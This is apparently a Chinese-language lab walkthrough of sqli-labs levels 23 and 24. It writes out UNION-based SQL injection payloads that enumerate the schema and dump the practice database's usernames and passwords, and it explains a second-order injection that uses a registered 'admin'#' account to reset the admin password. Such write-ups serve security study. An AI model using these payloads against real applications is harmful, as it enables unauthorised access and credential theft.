# level23

+ 正常注入

~~~ shell
?id=1'or '1' = '1
~~~

![Less-23-1](./img/Less-23-1.PNG)



~~~ shell
?id=-1' union select 1,database(),version() or '1'='1
~~~

![Less-23-2](./img/Less-23-2.PNG)



~~~ shell
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" or '1'='1
~~~

![Less-23-3](./img/Less-23-3.PNG)

~~~ text
Welcome    Dhakkan
Your Login name:2
Your Password:innodb_table_stats,innodb_index_stats,CHARACTER_SETS,CHECK_CONSTRAINTS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMNS_EXTENSIONS,COLUMN_STATISTICS,EVENTS,FILES,INNODB_DATAFILES,INNODB_FOREIGN,INNODB_FOREIGN_COLS,INNODB_FIELDS,INNODB_TABLESPACES_BRIEF,KEY_COLUMN_USAGE,KEYWORDS,PARAMETERS,PARTITIONS,REFERENTIAL_CONSTRAINTS,RESOURCE_GROUPS,ROUTINES,SCHEMATA,SCHEMATA_EXTENSIONS,ST_SPATIAL_REFERENCE_SYSTEMS,ST_UNITS_OF_MEASURE,ST_GEOMETRY_COLUMNS,STATISTICS,TABLE_CONSTRAINTS,TABLE_CONSTRAINTS_EXTENSIONS,TABLES,TABLES_EXTENSIONS,TABLESPACES_EXTENSIONS,TRIGGERS,VIEW_ROUTINE_USAGE,VIEW_TABLE_USAGE,VIEWS,COLUMN_PRIVILEGES,ENGINES,OPTIMIZER_TRACE,PLUGINS,PROCESSLIST,PROFILING,SCHEMA_PRIVILEGES,TABLESPACES,TABLE_PRIVILEGES,USER_PRIVILEGES,cond_instances,error_log,events_waits_current,events_waits_history,events_waits_history_long,events_waits_summary_by_host_by_event_name,events_waits_summary_by_instance,events_waits_summary_by_thread_by_event_name,events_waits_summary_by_user_by_event_name,events_wait
~~~



~~~ shell
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name="FILES" or '1'='1
~~~

![Less-23-4](./img/Less-23-4.PNG)

~~~ text
Welcome    Dhakkan
Your Login name:2
Your Password:database_name,table_name,last_update,n_rows,clustered_index_size,sum_of_other_index_sizes,database_name,table_name,index_name,last_update,stat_name,stat_value,sample_size,stat_description,CHARACTER_SET_NAME,DEFAULT_COLLATE_NAME,DESCRIPTION,MAXLEN,CONSTRAINT_CATALOG,CONSTRAINT_SCHEMA,CONSTRAINT_NAME,CHECK_CLAUSE,COLLATION_NAME,CHARACTER_SET_NAME,ID,IS_DEFAULT,IS_COMPILED,SORTLEN,PAD_ATTRIBUTE,COLLATION_NAME,CHARACTER_SET_NAME,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ORDINAL_POSITION,COLUMN_DEFAULT,IS_NULLABLE,DATA_TYPE,CHARACTER_MAXIMUM_LENGTH,CHARACTER_OCTET_LENGTH,NUMERIC_PRECISION,NUMERIC_SCALE,DATETIME_PRECISION,CHARACTER_SET_NAME,COLLATION_NAME,COLUMN_TYPE,COLUMN_KEY,EXTRA,PRIVILEGES,COLUMN_COMMENT,GENERATION_EXPRESSION,SRS_ID,TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME,COLUMN_NAME,ENGINE_ATTRIBUTE,SECONDARY_ENGINE_ATTRIBUTE,SCHEMA_NAME,TABLE_NAME,COLUMN_NAME,HISTOGRAM,EVENT_CATALOG,EVENT_SCHEMA,EVENT_NAME,DEFINER,TIME_ZONE,EVENT_BODY,EVENT_DEFINITION,EVENT_TYPE,EXECUTE_AT,INTERVAL_VALUE,INTERVAL_FIELD
~~~



+ 在这一步不知道是什么问题，无法提取数据了，并报错

~~~ shell
?id=-1' union select group_concat(database_name) from FILES or '1'='1
~~~

![Less-23-8](./img/Less-23-8.PNG)

~~~ text
Welcome    Dhakkan

Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in E:\phpstudy\phpstudy_pro\WWW\sqli-labs\Less-23\index.php on line 38
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'or '1'='1' LIMIT 0,1' at line 1
~~~



+ 重新换一个回显位，并重复以上的三项爆破，这次成功了

~~~ shell
?id=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema="security"),3 or '1'='1
~~~

![Less-23-6](./img/Less-23-6.PNG)

~~~ text
Welcome    Dhakkan
Your Login name:emails,referers,uagents,users
Your Password:1
~~~



~~~ shell
?id=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name="users" and table_schema="security"),3 or '1'='1
~~~

![Less-23-7](./img/Less-23-7.PNG)

~~~text
Welcome    Dhakkan
Your Login name:id,password,username
Your Password:1
~~~





~~~ shell
?id=-1' union select 1,(select group_concat(username,password) from users),3 or '1'='1
~~~

![Less-23-5](./img/Less-23-5.PNG)

~~~ text
Welcome    Dhakkan
Your Login name:DumbDumb,AngelinaI-kill-you,Dummyp@ssword,securecrappy,stupidstupidity,supermangenious,batmanmob!le,adminadmin,admin1admin1,admin2admin2,admin3admin3,dhakkandumbo,admin4admin4
Your Password:1
~~~



# level24

~~~ text
第二十四关有一个登录页面和注册页面还要一个修改密码页面，该关卡使用得是二次注入，因为登录页面和注册页面对于密码和账户名都使用mysql_real_escape_string函数对于特殊字符进行转义。这里我们利用的是注册页面，因为虽然存在函数对特殊字符进行转义，但只是在调用sql语句时候进行转义，当注册成功后账户密码存在到数据库的时候是没有转义的，以原本数据存入数据库的。当我们修改密码的时候，对于账户名是没有进行过滤的。
~~~

![09682f62c14141b5ac76ac68f0e119b3](./img/09682f62c14141b5ac76ac68f0e119b3.png)

![e388adf190c942378903432e327bc822](./img/e388adf190c942378903432e327bc822.png)



首先我们看到管理员账户，admin，密码是admin,但是通常情况下我们是不知道密码的，只能猜测管理员账户的admin。我们先注册一个账号名叫<code>admin'#</code>。

![bb41b4eaf6674a4c8c477764c40c51aa](./img/Less-24-3.PNG)



我们先注册一个账号名叫<code>admin'#</code>。可以看到我们成功将有污染的数据写入数据库。**单引号是为了和之后密码修改的用户名的单引号进行闭合，#是为了注释后面的数据。**

![Less-24-1](./img/Less-24-1.PNG)

![5e342978e3b54ffc963764f8deb51beb](./img/Less-24-4.PNG)

之后也用户名admin'#和密码是123456登录，进入修改密码页面。原始密码输入123456，新密码我输入的是111111，可以看到密码修改成功。

![Less-24-2](./img/Less-24-5.PNG)

![0a62e48c4af84c5b87204405aaaa86fa](./img/Less-24-6.PNG)

![e5be9e28d556404ca90911d44f4ff881](./img/Less-24-7.PNG)

![28a3d4e10def4be98a151bea907b8270](./img/28a3d4e10def4be98a151bea907b8270.png)

当我们数据库查看的时候发现修改的是管理员的密码。而不是我们的注册账户的密码。

![ae806d5ca34d4b1990c78b1983e8a214](./img/Less-24-8.PNG)
